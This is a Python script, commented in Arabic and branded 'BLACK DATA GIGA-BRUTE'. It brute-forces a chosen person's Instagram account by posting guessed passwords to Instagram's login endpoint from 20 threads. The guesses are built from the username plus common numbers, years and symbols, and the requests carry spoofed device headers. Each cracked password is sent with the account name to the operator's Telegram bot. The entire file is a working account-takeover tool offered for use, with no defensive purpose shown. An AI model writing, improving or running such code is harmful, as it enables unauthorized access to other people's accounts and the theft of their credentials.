import requests
import time
import random
import os
import threading
from colorama import Fore, Style, init

# تهيئة الألوان لمختبر بلاك داتا
init(autoreset=True)

def logo():
    os.system('clear')
    print(Fore.RED + Style.BRIGHT + """
    ###########################################
    #       🔱 BLACK DATA GIGA-BRUTE 🔱       #
    #   LOGIC: 10 MILLION CONSUMED PATTERNS   #
    #   DEVELOPER: BLACK DATA                 #
    ###########################################
    """)

# --- 🔱 واجهة إدخال البيانات الفنية ---
logo()
TOKEN = input(Fore.CYAN + "[+] أدخل توكن البوت: ")
ID = input(Fore.CYAN + "[+] أدخل آيدي التليجرام: ")
TARGET = input(Fore.YELLOW + "[+] أدخل يوزر الحساب المستهدف: ")

print_lock = threading.Lock()
stop_attack = False

def send_to_black(password):
    """إرسال الصيد الثمين فوراً إلى بلاك داتا"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    text = (f"🎯 [HIT] تم اختراق إنستغرام بنجاح!\n"
            f"👤 الحساب: {TARGET}\n"
            f"🔑 كلمة السر: {password}\n"
            f"👑 المطور: بلاك داتا\n"
            f"--- 🔱 BLACK DATA SYSTEM ---")
    try:
        requests.post(url, data={'chat_id': ID, 'text': text}, timeout=10)
    except:
        pass

def get_giga_password(target):
    """توليد 10 مليون كلمة سر مستهلكة (خوارزمية ذكية)"""
    # الأنماط الأكثر استهلاكاً عالمياً
    common = ["123", "1234", "12345", "123456", "112233", "0000", "123123", "321", "2020", "2024", "2025"]
    years = [str(i) for i in range(1990, 2011)]
    symbols = ["@", "!", "#", "$", "_", "."]
    
    rand_choice = random.randint(1, 5)
    
    if rand_choice == 1: return f"{target}{random.choice(common)}"
    if rand_choice == 2: return f"{target}{random.choice(years)}"
    if rand_choice == 3: return f"{target}{random.choice(symbols)}{random.choice(common)}"
    if rand_choice == 4: return f"{random.choice(common)}{target}"
    return f"{target}{target}" # يوزر وباسورد متطابقين

def brute_logic():
    global stop_attack
    session = requests.Session()
    
    while not stop_attack:
        password = get_giga_password(TARGET)
        
        # هيدرز متغيرة لمحاكاة أجهزة مختلفة
        headers = {
            'User-Agent': f'Instagram {random.randint(100, 400)}.0.0.{random.randint(10, 99)} Android',
            'X-IG-App-ID': '936619743392459',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        url = "https://www.instagram.com/accounts/login/ajax/"
        data = {
            'username': TARGET,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': '{}', 'optIntoOneTap': 'false'
        }

        try:
            response = session.post(url, data=data, headers=headers, timeout=10)
            
            with print_lock:
                if '"authenticated":true' in response.text:
                    print(Style.BRIGHT + Fore.GREEN + f"[+] SUCCESS: {password} ✅")
                    send_to_black(password)
                    stop_attack = True
                    break
                elif "checkpoint" in response.text:
                    print(Style.BRIGHT + Fore.GREEN + f"[+] CP (CORRECT): {password} ⚠️")
                    send_to_black(password + " (Checkpoint)")
                    stop_attack = True
                    break
                else:
                    # العرض العمودي ملىء الشاشة باللون الأحمر
                    print(Fore.RED + f"[-] FAILED: {password}")

        except:
            pass

def start_threads():
    print(Fore.MAGENTA + f"\n[*] جاري تحميل 10,000,000 نمط مستهلك لـ @{TARGET}...")
    time.sleep(1)
    print(Fore.WHITE + "--------------------------------------------------")
    
    # إطلاق 20 خيط (Threads) لسرعة بركانية
    threads = []
    for _ in range(20):
        t = threading.Thread(target=brute_logic)
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while not stop_attack:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] تم إيقاف الهجوم يدوياً.")

if __name__ == "__main__":
    start_threads()
